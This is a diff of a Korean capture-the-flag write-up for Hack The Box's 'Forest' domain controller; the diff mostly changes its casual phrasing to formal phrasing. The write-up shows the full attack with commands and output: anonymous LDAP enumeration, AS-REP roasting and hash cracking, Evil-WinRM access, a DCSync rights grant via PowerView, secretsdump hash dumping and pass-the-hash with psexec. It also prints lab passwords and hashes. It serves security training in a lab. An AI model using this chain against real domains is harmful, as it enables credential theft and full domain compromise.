@@ -4,35 +4,35 @@ title: "[HTB][AD][Easy] Forest"
 date:   2026-11-09 20:59:05 +09:00
 categories: [AD, Easy]
 ---
-**작성자:** k1ph4ru **머신 제작자:** egre55 & mrb3n **난이도:** 쉬움 (Easy) **분류:** 공식 (Official) 
+**작성자:** k1ph4ru **머신 제작자:** egre55 & mrb3n **난이도:** 쉬움 (Easy) **분류:** 공식 (Official)
 
-개요 (Synopsis) 
+개요 (Synopsis)
 
-Forest는 Exchange Server가 설치된 도메인의 도메인 컨트롤러(DC)를 보여주는 쉬운 난이도의 Windows 머신이야. 이 DC는 익명 LDAP 바인딩을 허용하며, 이를 통해 도메인 객체를 열거할 수 있어. Kerberos 사전 인증(pre-authentication)이 비활성화된 서비스 계정의 비밀번호를 크랙하여 초기 침투(foothold)가 가능해. 해당 서비스 계정은 Account Operators 그룹의 구성원인 것으로 밝혀지는데, 이를 이용해 권한이 있는 Exchange 그룹에 사용자를 추가할 수 있어. 이 Exchange 그룹 멤버십을 활용하여 도메인에 대한 DCSync 권한을 얻고 NTLM 해시를 덤프하여 시스템을 장악하게 돼.
+Forest는 Exchange Server가 설치된 도메인의 도메인 컨트롤러(DC)를 보여주는 쉬운 난이도의 Windows 머신이다. 이 DC는 익명 LDAP 바인딩을 허용하며, 이를 통해 도메인 객체를 열거할 수 있다. Kerberos 사전 인증(pre-authentication)이 비활성화된 서비스 계정의 비밀번호를 크랙하여 초기 침투(foothold)가 가능하다. 해당 서비스 계정은 Account Operators 그룹의 구성원인 것으로 밝혀지는데, 이를 이용해 권한이 있는 Exchange 그룹에 사용자를 추가할 수 있다. 이 Exchange 그룹 멤버십을 활용하여 도메인에 대한 DCSync 권한을 얻고 NTLM 해시를 덤프하여 시스템을 장악하게 된다.
 
-요구 기술 (Skills Required) 
+요구 기술 (Skills Required)
 
-* 열거 (Enumeration) 
-
-
-
-습득 기술 (Skills Learned) 
-
-* ASREPRoasting 
+* 열거 (Enumeration)
 
 
-* Bloodhound를 이용한 열거 
+
+습득 기술 (Skills Learned)
+
+* ASREPRoasting
 
 
-* DCSync 공격 
+* Bloodhound를 이용한 열거
+
+
+* DCSync 공격
 
 
 
 ---
 
-열거 (Enumeration) 
+열거 (Enumeration)
 
-Nmap 
+Nmap
 
 ```bash
 ports=$(nmap -p- --min-rate=1000 -T4 -Pn TARGET_IP | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
@@ -103,16 +103,16 @@ Nmap done: 1 IP address (1 host up) scanned in 84.81 seconds
 
 ```
 
-이 머신은 `htb.local` 도메인의 도메인 컨트롤러로 보여. 이것을 `/etc/hosts` 파일에 추가해 줄게.
+이 머신은 `htb.local` 도메인의 도메인 컨트롤러로 보인다. 이것을 `/etc/hosts` 파일에 추가해 줄게.
 
 ```bash
 echo "TARGET_IP htb.local" | sudo tee -a /etc/hosts
 
 ```
 
-LDAP 
+LDAP
 
-`ldapsearch` 도구를 사용하여 LDAP 서비스가 익명 바인딩을 허용하는지 확인해 볼 가치가 있어.
+`ldapsearch` 도구를 사용하여 LDAP 서비스가 익명 바인딩을 허용하는지 확인해 볼 가치가 있다.
 
 ```bash
 └─$ ldapsearch -x -H ldap://TARGET_IP:389 -b "dc=htb,dc=local"
@@ -138,9 +138,9 @@ cn: Users
 
 ```
 
-`-x` 플래그는 익명 인증을 지정하는 데 사용되고, `-b` 플래그는 검색을 시작할 기본 DN(basedn)을 나타내. 자격 증명 없이 도메인을 쿼리할 수 있었으므로 null 바인딩이 활성화되어 있다는 뜻이야. `-H`는 LDAP URI(호스트 및 포트)를 지정해.
+`-x` 플래그는 익명 인증을 지정하는 데 사용되고, `-b` 플래그는 검색을 시작할 기본 DN(basedn)을 나타내. 자격 증명 없이 도메인을 쿼리할 수 있었으므로 null 바인딩이 활성화되어 있다는 뜻이다. `-H`는 LDAP URI(호스트 및 포트)를 지정한다.
 
-`windapsearch` 도구를 사용하면 도메인을 추가로 쿼리할 수 있어.
+`windapsearch` 도구를 사용하면 도메인을 추가로 쿼리할 수 있다.
 
 ```bash
 └─$ ./windapsearch.py -d htb.local -u "" --dc-ip TARGET_IP -U
@@ -173,7 +173,7 @@ userPrincipalName: andy@htb.local
 
 ```
 
-`-U` 플래그는 모든 사용자, 즉 `objectCategory`가 `user`로 설정된 객체를 열거하는 데 사용돼. 몇 가지 사용자 이름과 사서함(mailbox) 계정을 찾았는데, 이는 도메인에 Exchange가 설치되어 있음을 의미해. 이제 `objectClass=*` 필터를 사용하여 도메인의 다른 모든 객체를 열거해 보자.
+`-U` 플래그는 모든 사용자, 즉 `objectCategory`가 `user`로 설정된 객체를 열거하는 데 사용된다. 몇 가지 사용자 이름과 사서함(mailbox) 계정을 찾았는데, 이는 도메인에 Exchange가 설치되어 있음을 의미한다. 이제 `objectClass=*` 필터를 사용하여 도메인의 다른 모든 객체를 열거한다.
 
 ```bash
 └─$ ./windapsearch.py -d htb.local --dc-ip TARGET_IP --custom "objectClass=*"
@@ -198,15 +198,15 @@ CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
 
 ```
 
-쿼리 결과 `svc-alfresco`라는 서비스 계정을 포함하여 312~313개의 고유한 객체를 찾았어. 온라인에서 `alfresco`를 검색하면 설정 문서로 연결돼. 문서에 따르면 이 서비스는 Kerberos 사전 인증(pre-authentication)을 비활성화해야 해.
+쿼리 결과 `svc-alfresco`라는 서비스 계정을 포함하여 312~313개의 고유한 객체를 찾았어. 온라인에서 `alfresco`를 검색하면 설정 문서로 연결된다. 문서에 따르면 이 서비스는 Kerberos 사전 인증(pre-authentication)을 비활성화해야 한다.
 
-이 말은 우리가 이 사용자에 대한 암호화된 TGT를 요청할 수 있다는 뜻이야. TGT에는 사용자의 NTLM 해시로 암호화된 데이터가 포함되어 있으므로, 이를 오프라인 무차별 대입 공격(brute force attack)에 사용하여 `svc-alfresco`의 비밀번호를 알아낼 수 있어.
+이 말은 우리가 이 사용자에 대한 암호화된 TGT를 요청할 수 있다는 뜻이다. TGT에는 사용자의 NTLM 해시로 암호화된 데이터가 포함되어 있으므로, 이를 오프라인 무차별 대입 공격(brute force attack)에 사용하여 `svc-alfresco`의 비밀번호를 알아낼 수 있다.
 
 ---
 
-초기 침투 (Foothold) 
+초기 침투 (Foothold)
 
-Impacket의 `GetNPUsers.py` 스크립트를 사용해 TGT 티켓을 요청하고 해시를 덤프할 수 있어.
+Impacket의 `GetNPUsers.py` 스크립트를 사용해 TGT 티켓을 요청하고 해시를 덤프할 수 있다.
 
 ```bash
 └─$ impacket-GetNPUsers htb.local/svc-alfresco -dc-ip TARGET_IP -no-pass
@@ -217,7 +217,7 @@ $krb5asrep$23$svc-alfresco@HTB.LOCAL:3a9baf4ab1696c6c8bc55a4d0b28b1f6$8df9465f05
 
 ```
 
-해시를 파일에 복사하고 JohnTheRipper를 사용하여 크랙을 시도해 보자.
+해시를 파일에 복사하고 JohnTheRipper를 사용하여 크랙을 시도한다.
 
 ```bash
 └─$ john hash --fork=4 -w=/usr/share/wordlists/rockyou.txt
@@ -230,7 +230,7 @@ Session completed.
 
 ```
 
-이 계정의 비밀번호는 `s3rvice`로 밝혀졌어. 5985 포트도 열려 있으므로, Evil-WinRM을 사용하여 WinRM을 통해 원격으로 로그인할 수 있는지 확인해 볼 수 있어.
+이 계정의 비밀번호는 `s3rvice`로 밝혀졌어. 5985 포트도 열려 있으므로, Evil-WinRM을 사용하여 WinRM을 통해 원격으로 로그인할 수 있는지 확인해 볼 수 있다.
 
 ```powershell
 └─$ evil-winrm -i TARGET_IP -u svc-alfresco -p s3rvice
@@ -247,13 +247,13 @@ htb\svc-alfresco
 
 ```
 
-인증에 성공하여 서버에서 명령을 실행할 수 있게 되었어. `C:\users\svc-alfresco\Desktop\user.txt`에서 사용자 플래그(user flag)를 가져올 수 있어.
+인증에 성공하여 서버에서 명령을 실행할 수 있게 되었어. `C:\users\svc-alfresco\Desktop\user.txt`에서 사용자 플래그(user flag)를 가져올 수 있다.
 
 ---
 
-권한 상승 (Privilege Escalation) 
+권한 상승 (Privilege Escalation)
 
-Bloodhound를 사용해 도메인을 시각화하고 권한 상승 경로를 찾아보자. 또한 SharpHound 실행 파일을 타겟에 업로드하고 실행하여 도메인에 대한 데이터를 수집할 거야.
+Bloodhound를 사용해 도메인을 시각화하고 권한 상승 경로를 찾아본다. 또한 SharpHound 실행 파일을 타겟에 업로드하고 실행하여 도메인에 대한 데이터를 수집할 것이다.
 
 ```powershell
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload SharpHound.exe
@@ -274,17 +274,17 @@ Info: Download successful!
 
 ```
 
-그런 다음 이 데이터를 Bloodhound에 업로드하고, `svc-alfresco` 사용자를 검색한 후 소유함(owned)으로 표시해. 노드를 클릭하면 오른쪽에 속성이 표시돼. `svc-alfresco`가 중첩된 멤버십을 통해 9개 그룹의 구성원인 것을 알 수 있어. 9를 클릭하면 멤버십 그래프가 나타나.
+그런 다음 이 데이터를 Bloodhound에 업로드하고, `svc-alfresco` 사용자를 검색한 후 소유함(owned)으로 표시한다. 노드를 클릭하면 오른쪽에 속성이 표시된다. `svc-alfresco`가 중첩된 멤버십을 통해 9개 그룹의 구성원인 것을 알 수 있다. 9를 클릭하면 멤버십 그래프가 나타나.
 
 ![alt text](/assets/images/htb/ad/easy/forest/image.png)
 
-중첩된 그룹 중 하나가 권한이 있는 AD 그룹인 Account Operators인 것으로 확인됐어. 문서에 따르면 Account Operators 그룹 멤버는 사용자를 생성 및 수정하고, 보호되지 않는 그룹에 사용자를 추가할 수 있어. 이를 기억해 두고 Domain Admins로 가는 경로를 살펴보자. Queries를 클릭하고 'Shortest Path to High value targets'를 선택해.
+중첩된 그룹 중 하나가 권한이 있는 AD 그룹인 Account Operators인 것으로 확인됐다. 문서에 따르면 Account Operators 그룹 멤버는 사용자를 생성 및 수정하고, 보호되지 않는 그룹에 사용자를 추가할 수 있다. 이를 기억해 두고 Domain Admins로 가는 경로를 살펴본다. Queries를 클릭하고 'Shortest Path to High value targets'를 선택한다.
 
 ![alt text](/assets/images/htb/ad/easy/forest/image-1.png)
 
-경로 중 하나를 보면 Exchange Windows Permissions 그룹이 도메인에 대한 `writeDacl` 권한을 가지고 있는 걸 알 수 있어. `writeDACL` 권한은 사용자가 객체에 ACL을 추가할 수 있게 해줘. 우리는 사용자를 이 그룹에 추가하고 DCSync 권한을 부여할 수 있어.
+경로 중 하나를 보면 Exchange Windows Permissions 그룹이 도메인에 대한 `writeDacl` 권한을 가지고 있는 걸 알 수 있다. `writeDACL` 권한은 사용자가 객체에 ACL을 추가할 수 있게 해줘. 우리는 사용자를 이 그룹에 추가하고 DCSync 권한을 부여할 수 있다.
 
-WinRM 쉘로 돌아가서 `Exchange Windows Permissions` 및 `Remote Management Users` 그룹에 새 사용자를 추가해 보자.
+WinRM 쉘로 돌아가서 `Exchange Windows Permissions` 및 `Remote Management Users` 그룹에 새 사용자를 추가한다.
 
 ```powershell
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user john abc123! /add /domain
@@ -298,8 +298,8 @@ The command completed successfully.
 
 ```
 
-위의 명령은 `john`이라는 새 사용자를 생성하고 그를 필요한 그룹에 추가해.
-다음으로, PowerView 스크립트를 다운로드하여 현재 세션으로 가져올 거야.
+위의 명령은 `john`이라는 새 사용자를 생성하고 그를 필요한 그룹에 추가한다.
+다음으로, PowerView 스크립트를 다운로드하여 현재 세션으로 가져올 것이다.
 
 ```powershell
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload ./PowerSploit/Recon/PowerView.ps1
@@ -312,7 +312,7 @@ Info: Upload successful!
 
 ```
 
-이제 `john`의 자격 증명과 함께 `Add-ObjectACL`을 사용하여 그에게 DCSync 권한을 부여할 수 있어.
+이제 `john`의 자격 증명과 함께 `Add-ObjectACL`을 사용하여 그에게 DCSync 권한을 부여할 수 있다.
 
 ```powershell
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> . ./PowerView.ps1
@@ -322,7 +322,7 @@ Info: Upload successful!
 
 ```
 
-이제 DCSync 공격을 실행할 수 있어. Impacket의 `secretsdump` 스크립트를 `john` 계정으로 실행하여 모든 도메인 사용자의 NTLM 해시를 알아낼 수 있지.
+이제 DCSync 공격을 실행할 수 있다. Impacket의 `secretsdump` 스크립트를 `john` 계정으로 실행하여 모든 도메인 사용자의 NTLM 해시를 알아낼 수 있다.
 
 ```bash
 └─$ impacket-secretsdump htb/john@TARGET_IP
@@ -339,7 +339,7 @@ krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
 
 ```
 
-획득한 Domain Admin 해시를 이용해 `psexec`으로 administrator 권한으로 타겟에 접근할 수 있어.
+획득한 Domain Admin 해시를 이용해 `psexec`으로 administrator 권한으로 타겟에 접근할 수 있다.
 
 ```bash
 └─$ impacket-psexec administrator@TARGET_IP -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
@@ -359,4 +359,4 @@ C:\Windows\system32>
 
 ```
 
-루트 플래그는 `C:\users\Administrator\Desktop\root.txt`에서 얻을 수 있어.
+루트 플래그는 `C:\users\Administrator\Desktop\root.txt`에서 얻을 수 있다.
